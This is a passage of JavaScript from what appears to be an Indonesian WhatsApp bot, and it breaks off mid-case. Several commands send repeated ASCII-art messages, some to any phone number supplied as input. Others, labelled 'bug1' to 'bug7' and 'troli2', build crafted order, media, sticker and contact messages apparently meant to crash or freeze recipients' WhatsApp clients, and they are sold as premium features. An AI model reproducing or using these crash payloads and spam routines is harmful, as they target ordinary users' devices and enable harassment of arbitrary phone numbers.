░░░██░░░░░░░█░░█▄▄▄▄░▀▀██░░█░░░
░░░██░░░░░░░█░░▀████████░░█░░░░
░░█░░█░░░░░░░█░░▀▄▄▄▄██░░█░░░░░
░░█░░░█░░░░░░░█░░░░░░░░░█░░░░░░
░█░░░░░█░░░░░░░░░░░░░░░░█░░░░░░
░░░░░░░░█░░░░░░█░░░░░░░░█░░░░░░
░░░░░░░░░░░░░░░░████████░░░░░░░
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
m.reply('Sukses Mas Bro')
}
            break
case 'mukajelekto': {            
          if (!isCreator) return
if (!text) throw `MANA NOMORNYA?`
             korak = `
░░░░░░░░███████████████░░░░░░░░
░░░░░█████████████████████░░░░░
░░░░████████████████████████░░░
░░░██████████████████████████░░
░░█████████████████████████████
░░███████████▀░░░░░░░░░████████
░░███████████░░░░░░░░░░░░░░░███
░████████████░░░░░░░░░░░░░░░░██
░█░░███████░░░░░░░░░░░▄▄░░░░░██
█░░░░█████░░░░░░▄███████░░██░░█
█░░█░░░███░░░░░██▀▀░░░░░░░░██░█
█░░░█░░░░░░░░░░░░▄██▄░░░░░░░███
█░░▄█░░░░░░░░░░░░░░░░░░█▀▀█▄░██
█░░░░░░░░░░░░░░░░░░░░░░█░░░░██░
░███░░░░░░░░░░░░░░░░░░░█░░░░█░░
░░█░█░░░░░░░█░░░░░██▀▄░▄██░░░█░
░░█░█░░░░░░█░░░░░░░░░░░░░░░░░█░
░░░██░░░░░░█░░░░▄▄▄▄▄▄░░░░░░█░░
░░░██░░░░░░░█░░█▄▄▄▄░▀▀██░░█░░░
░░░██░░░░░░░█░░▀████████░░█░░░░
░░█░░█░░░░░░░█░░▀▄▄▄▄██░░█░░░░░
░░█░░░█░░░░░░░█░░░░░░░░░█░░░░░░
░█░░░░░█░░░░░░░░░░░░░░░░█░░░░░░
░░░░░░░░█░░░░░░█░░░░░░░░█░░░░░░
░░░░░░░░░░░░░░░░████████░░░░░░░
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
m.reply('Sukses Mas Bro')
}
            break
case 'gasmukajelek': {            
          if (!isCreator) return
if (!text) throw `MANA NOMORNYA?`
             korak = `
░░░░░░░░███████████████░░░░░░░░
░░░░░█████████████████████░░░░░
░░░░████████████████████████░░░
░░░██████████████████████████░░
░░█████████████████████████████
░░███████████▀░░░░░░░░░████████
░░███████████░░░░░░░░░░░░░░░███
░████████████░░░░░░░░░░░░░░░░██
░█░░███████░░░░░░░░░░░▄▄░░░░░██
█░░░░█████░░░░░░▄███████░░██░░█
█░░█░░░███░░░░░██▀▀░░░░░░░░██░█
█░░░█░░░░░░░░░░░░▄██▄░░░░░░░███
█░░▄█░░░░░░░░░░░░░░░░░░█▀▀█▄░██
█░░░░░░░░░░░░░░░░░░░░░░█░░░░██░
░███░░░░░░░░░░░░░░░░░░░█░░░░█░░
░░█░█░░░░░░░█░░░░░██▀▄░▄██░░░█░
░░█░█░░░░░░█░░░░░░░░░░░░░░░░░█░
░░░██░░░░░░█░░░░▄▄▄▄▄▄░░░░░░█░░
░░░██░░░░░░░█░░█▄▄▄▄░▀▀██░░█░░░
░░░██░░░░░░░█░░▀████████░░█░░░░
░░█░░█░░░░░░░█░░▀▄▄▄▄██░░█░░░░░
░░█░░░█░░░░░░░█░░░░░░░░░█░░░░░░
░█░░░░░█░░░░░░░░░░░░░░░░█░░░░░░
░░░░░░░░█░░░░░░█░░░░░░░░█░░░░░░
░░░░░░░░░░░░░░░░████████░░░░░░░
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
            await sleep(30000)
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
            await sleep(30000)
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
            await sleep(30000)
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
            await sleep(30000)
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
            await sleep(30000)
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
            await sleep(30000)
            m.reply('Sukses Mas Bro')
            }
            break
case 'gantengbos': {            
          if (!isCreator) return
             korak = `
███████▄▄███████████▄
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓███░░░░░░░░░░░░█
██████▀░░█░░░░██████▀
░░░░░░░░░█░░░░█
░░░░░░░░░░█░░░█
░░░░░░░░░░░█░░█
░░░░░░░░░░░█░░█
░░░░░░░░░░░░▀▀
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
m.reply('Sukses Mas Bro')
}
            break
case 'cemenbos': {            
          if (!isCreator) return
             korak = `

╔═══╦══╦╗╔═╗
║╔═╗╠╣╠╣║║╔╝
║╚═╝║║║║╚╝╝
║╔╗╔╝║║║╔╗║
║║║╚╦╣╠╣║║╚╗
╚╝╚═╩══╩╝╚═╝
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
m.reply('Sukses Mas Bro')
}
            break
case 'tutordek': {            
          if (!isCreator) return
             korak = `
╔══╦╦╦══╦═╦═╗╔══╦═╦╦╗
╚╗╔╣║╠╗╔╣║║╬║╚╗╗║╦╣╔╝
─║║║║║║║║║║╗╣╔╩╝║╩╣╚╗
─╚╝╚═╝╚╝╚═╩╩╝╚══╩═╩╩╝
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
m.reply('Sukses Mas Bro')
}
            break
case 'welcomebos': {            
          if (!isCreator) return
             korak = `
───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───
───█▒▒░░░░░░░░░▒▒█───
────█░░█░░░░░█░░█────
─▄▄──█░░░▀█▀░░░█──▄▄─
█░░█─▀▄░░░░░░░▄▀─█░░█
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
█░░║║║╠─║─║─║║║║║╠─░░█
█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
m.reply('Sukses Mas Bro')
}
            break
case 'helidek': {            
          if (!isCreator) return
             korak = `
─▀▀▀▀▀▀▀▀▀▀▀▄▄▀▀▀▀▀▀▀▀▀▀▀
───────────█▀▀█
──────────█▓▓▓▓█
──────══▄▀█▓▓▓▓█▀▄══
─▄▄▄▄▄▄▄█▒█▓▓▓▓█▒█▄▄▄▄▄▄▄
─█▀▀▀▀█▀███▄▓▓▄███▀█▀▀▀▀█
▄█▄──▄█▄───▀██▀───▄█▄──▄█▄
█▒█──█▒█──────────█▒█──█▒█
▀▀▀──▀▀▀──────────▀▀▀──▀▀▀
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
m.reply('Sukses Mas Bro')
}
            break
case 'serembos': {            
          if (!isCreator) return
             korak = `
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒

`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
m.reply('Sukses Mas Bro')
}
            break
case 'rikbos': {            
          if (!isCreator) return
             korak = `

█████████████████
█▄─▄▄▀█▄─▄█▄─█─▄█
██─▄─▄██─███─▄▀██
▀▄▄▀▄▄▀▄▄▄▀▄▄▀▄▄▀
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
m.reply('Sukses Mas Bro')
}
            break
case 'tengkorak': {            
          if (!isCreator) return
             korak = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
m.reply('Sukses Mas Bro')
}
            break
case 'tengkorakto': {            
          if (!isCreator) return
if (!text) throw `MANA NOMORNYA?`
             korak = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
m.reply('Sukses Mas Bro')
}
            break
case 'gastengkorak': {            
          if (!isCreator) return
if (!text) throw `MANA NOMORNYA?`
             korak = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
            await sleep(30000)
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
            await sleep(30000)
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
            await sleep(30000)
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
            await sleep(30000)
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
            await sleep(30000)
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
            await sleep(30000)
            m.reply('Sukses Mas Bro')
            }
            break
          case 'virtext': { 
          if (!isCreator) return
          if (!text) throw `MANA NOMORNYA?` 
             momoe = `

──────╔╗───╔╗
─────╔╝╚╗──║║
╔╗╔╦╦╩╗╔╬══╣║╔╦══╗
║╚╝╠╣╔╣║║║═╣╚╝╣══╣
╚╗╔╣║║║╚╣║═╣╔╗╬══║
─╚╝╚╩╝╚═╩══╩╝╚╩══╝
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
            await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            m.reply('Sukses Mas Bro')
            }
            break

case 'malam':
case 'mlm':
case 'sore':
case 'siang':
case 'pagi': {            
          if (!isCreator) return
             salem = `HALO KAK
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:salem},{quoted:asukonyol11})
}
break
case 'sayangdek': {            
          if (!isCreator) return
             salem = `apa sayang
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:salem},{quoted:asukonyol11})
}
break
case 'jomblodek': {            
          if (!isCreator) return
             salem = `aku juga jomblo sayang
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:salem},{quoted:asukonyol11})
}
break
case 'troli2': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./rikilah/image/rikgans.jpg') }, { upload: rikibos.waUploadToServer })
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
						"orderId": "2887423378068212",
						"jpegThumbnail": fs.readFileSync('./rikilah/image/rikibos.jpg'),
						"itemCount": 500,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
						"orderTitle": "rikibos",
						"sellerJid": "6287741097274@s.whatsapp.net",
						"token": "AR4Ly9KN85K11sPksXetxtC/ETXUQzGquZpw5M0COFWF5A==",
						"totalAmount1000": "50000000",
						"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
rikibos.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break
case 'verify':{
if (isRegistered) return reply('Akun Kamu Sudah Terverfikasi!!!')
await sendButRegis(from)
}
break
case 'bug1': {
if (!isPrem) return replyPremium(mess.premium)
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: m.chat, quoted: doc })
rikibos.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break
//=================================================//
case 'bug2': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./rikilah/image/rikgans.jpg') }, { upload: rikibos.waUploadToServer })
var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
"mimetype": "image/jpeg",
"caption": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
"fileLength": "42521",
"height": 426,
"width": 640,
"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
"mediaKeyTimestamp": "1657286523",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
rikibos.relayMessage(m.chat, image.message, { messageId: image.key.id })
}
break
//=================================================//
case 'bug3': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./rikilah/image/rikgans.jpg') }, { upload: rikibos.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "application/octet-stream",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: doc })
rikibos.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
//=================================================//
case 'bug4': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
"matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
"description": "Undangan Grup WhatsApp",
"title": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"previewType": "NONE",					
}
}), { userJid: m.chat, quoted: doc })
rikibos.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
//=================================================//
case 'bug5': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}), { userJid: m.chat, quoted: doc })
rikibos.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
}
break
//=================================================//
case 'bug6': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./rikilah/image/rikgans.jpg') }, { upload: rikibos.waUploadToServer })
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": "https://wa.me/c/6287741097274",
"matchedText": "https://wa.me/c/6287741097274",
"description": "Developer 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳\nWhatsApp",
"title": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
rikibos.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
//=================================================//
case 'bug7': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
